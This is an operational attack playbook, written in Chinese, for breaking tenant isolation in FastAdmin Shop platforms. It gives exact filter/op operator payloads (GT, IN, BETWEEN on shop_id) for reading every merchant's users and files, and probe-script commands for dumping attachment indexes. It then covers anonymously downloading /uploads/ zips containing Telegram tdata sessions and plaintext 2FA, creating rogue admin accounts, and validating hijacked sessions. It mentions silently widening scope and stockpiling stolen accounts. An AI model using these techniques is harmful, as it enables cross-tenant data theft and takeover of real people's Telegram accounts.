> Skill：`杀招/快府·横夺`  
> 探针：`炼蛊房/fastadmin_shop_tenant_probe.py`  
> 对象矩阵：`万我.md`  
> 对照案：`案卷/tg507mx_20260816/`（R2 源：EQ 隔离 ≠ 运算符隔离；**2026-08-17 该站已修，勿再打 507 复现**）  
> 参考：（开源包不收个案摘记）  
> **仅授权 targets**。同源产品子域（`wa/line/ins` 等同机 Docker）可静默扩权；报告旁站 / 第三方 UAT 不扩。

---

## 0. 一句话

FastAdmin Shop（`app=shop_hq`）的多租户隔离若把 `shop_id` 交给客户端 `filter/op`，**改值（EQ）看起来隔离，改运算符（GT/IN）就全平台可读**。  
WAF 拦 `EXP` / `OR 1=1` **不算**隔离成立。低权客服票 + 附件库 + `/uploads/` 无认证 = 跨商户账号 + tdata 会话。

**禁止**：只测「把 shop_id 改成别人的 EQ」阴性就写「无跨租 IDOR」。

## 2. 证明分级（禁止跳级）

| 级别 | 含义 | 本家族例子 |
|------|------|------------|
| observed | Shop 后台在 | `/shop_hq/index/login`、`window.Config` |
| primitive | 未授权面 | `/uploads/` 200；CORS `*`；PHP 报错路径 |
| local_proof | 任意身份 + **运算符矩阵** | GT 后 `total` 远大于本店，且行内出现异 `shop_id` |
| remote_proof | 附件 URL + 无认证下到 tdata/2FA | 样本 zip 内有 `2FA.txt` 或 `tdata/` |
| takeover | 跨商户 session 可外连，或自控管理号 | Telethon/官方客户端验活；**改原超管密默认禁止** |

```text
EQ 改 shop_id 仍只看见本店  ≠  隔离正确
filter 里写 OR 1=1 被 403   ≠  运算符安全
本店 0 台设备               ≠  平台没有 session（去别人的 shop）
建了管理员但绑不上超管组    ≠  BFLA 不存在
```

## 3. 逐帧杀伤链

### ① 指纹（无票也能做）

```bash
python3 炼蛊房/fastadmin_shop_tenant_probe.py recon \
  --base https://授权站 --case <案卷> --insecure
```

记：`app` 前缀（默认 `shop_hq`）、`window.Config` 上传路径/版本、HSTS、`Access-Control-Allow-Origin`、`/uploads/` 是否匿名 200。

### ② 任意身份进门 → 先填矩阵

客服坐席就够。Cookie 常见 `shop_keeplogin=UID|…`。  
立刻填 `案卷/object_matrix.md`：**他人 × 读用户 / 读附件 / 读配置**。本店空租户不是结案理由。

### ③ 假阴性帧（必须先打，禁止跳过）

同一张票、同一个 `user/user`，至少打四组：

| 组 | filter/op | 预期（有洞时） |
|----|-----------|----------------|
| A 基线 | 不传 / 只分页 | `total` = 本店 |
| B EQ 换租 | `filter={"shop_id":"<别人>"}` `op=EQ` 或默认 | 仍本店或空（**看起来隔离**） |
| C SQL | `filter={"id":"1 OR 1=1"}` 或 `op=EXP` | WAF 403（**不能当结案**） |
| D 运算符 | `filter={"shop_id":"0"}` `op={"shop_id":"GT"}` | `total` 暴涨，行内多 `shop_id` |

```
GET /{app}/user/user?page=1&limit=10
  &filter=%7B%22shop_id%22%3A%220%22%7D
  &op=%7B%22shop_id%22%3A%22GT%22%7D
```

```bash
python3 炼蛊房/fastadmin_shop_tenant_probe.py gt-probe \
  --base https://授权站 --app shop_hq --path user/user \
  --cookie 'shop_keeplogin=…' --case <案卷> --insecure
```

运算符矩阵默认：`GT GTE LT LTE > >= < <= IN BETWEEN NEQ <>`。  
`IN` 用 `[0,1,2]`；`BETWEEN` 用 `0,999999`。任一比基线 `total` 明显大或行内出现非本店 `shop_id` → **L2 成立**。

### ④ 同技法扫所有 index（不要只打 user）

FastAdmin 后端 `filter/op` 是公共 `Backend::buildparams()`，**每个 index 都可能中**。最少：

| 路径 | 看什么 |
|------|--------|
| `user/user` | 跨商户账号；字段 `code2` / 明文 PIN / mobile |
| `attachment/index` | 全平台文件 URL；`/uploads/ck/` tdata zip |
| `auth/admin` / `auth/group` | 权限组 `rules=*`（接 ⑥） |
| JS `backend/*.js` 里其它 index | 设备、任务、导出、daochu |

默认只拉一页做差分。全表先问（五十万级会打草惊蛇 + 撑爆案卷）。

### ⑤ `/uploads/` 无认证 + 附件 URL = session

```bash
python3 炼蛊房/fastadmin_shop_tenant_probe.py uploads \
  --base https://授权站 --case <案卷> --insecure \
  --url /uploads/ck/YYYYMMDD/<md5>.zip
```

无 Cookie 200 即 primitive。**目录 `/uploads/` 403 不等于文件 403**（nginx 关 listing 很常见）。必须用 attachment 吐出的具体 URL 测。zip 内常见：

```text
{TG_ID}/2FA.txt          ← 明文 2FA
{TG_ID}/tdata/<hex>/     ← Telegram 会话目录
```

成功口径是 **样本可解出可登录 session**，不是附件条数。入库走 `tg-account-library`。

### ⑥ BFLA（CHAIN-BETA，并行）

| 动作 | 路径 | 说明 |
|------|------|------|
| 读权限组 | `GET /{app}/auth/group/index` | 低权读到 `rules="*"` 即垂直越权 |
| 建管理员 | `POST /{app}/auth/admin/add` | 密码可控；绑超管组可能 **code=1 但 group_ids 静默失败** |
| 绑超管失败 | 不要死磕 | 回 ③④ 拿数据；改原超管密禁止 |

```bash
python3 炼蛊房/fastadmin_shop_tenant_probe.py bfla \
  --base https://授权站 --app shop_hq \
  --cookie 'shop_keeplogin=…' --case <案卷> --insecure
```

`--create` 才会真 POST 建号；默认只探测接口是否对低权开放。

### ⑦ 辅助泄露（记证据，不当主链）

- CORS `Access-Control-Allow-Origin: *`（`/api/`）
- PHP `array_intersect` / `Undefined index` 回显路径
- `window.Config`：版本、上传目录、扩展名白名单
- `Strict-Transport-Security: max-age=0` = 等于没开

### ⑧ 已排除就停（R2 实测，勿空转）

| 锤 | 常见结果 |
|----|----------|
| ThinkPHP RCE（2018-20062 / 2019-9082） | 自建 WAF 全拦 |
| ORDER BY / 经典 SQLi | WAF |
| SSRF | WAF |
| `.php` webshell | 扩展名白名单 + 内容检测 |
| `keeplogin` salt 爆破 | 50+ 常见 salt 常败 |
| CF 后源站 A 记录 | 常是 Tunnel，禁止把 `104.21.*` 当源站扫 |
| `group[]=超管组ID` | 写入静默失败 |

## 4. 对象矩阵怎么填

有任意 `shop_keeplogin` 就必须填，专卡只填格子：

| 对象 | 自己 | 他人 |
|------|------|------|
| 用户行 / `code2` | 本店 index | **GT filter 跨 shop_id** |
| 附件 / tdata | 本店 attachment | **同 op 打 attachment + 匿名 /uploads/** |
| 配置 / 权限组 | profile | **auth/group 读 `rules=*`** |
| 加款 | 本卡通常无 | 回矩阵换支付口；勿当本卡结案 |

本店 0 设备 → 他人格还是「未测」，禁止写复工结案。

## 5. 最短命令

```bash
# 无票指纹
python3 炼蛊房/fastadmin_shop_tenant_probe.py recon \
  --base 'https://授权站' --case <案卷> --insecure

# 有票：运算符矩阵（默认 1 页，禁止当全量导出）
python3 炼蛊房/fastadmin_shop_tenant_probe.py gt-probe \
  --base 'https://授权站' --app shop_hq --path user/user \
  --cookie 'shop_keeplogin=…' --case <案卷> --insecure

# 附件 index + 抽样匿名下载
python3 炼蛊房/fastadmin_shop_tenant_probe.py dump-index \
  --base 'https://授权站' --app shop_hq --path attachment/index \
  --cookie 'shop_keeplogin=…' --case <案卷> --insecure --pages 1
python3 炼蛊房/fastadmin_shop_tenant_probe.py uploads \
  --base 'https://授权站' --case <案卷> --insecure --from-dump
```

全表 / 批量下 tdata：**先问**。默认 `--pages 1`。`--full` 才翻完。
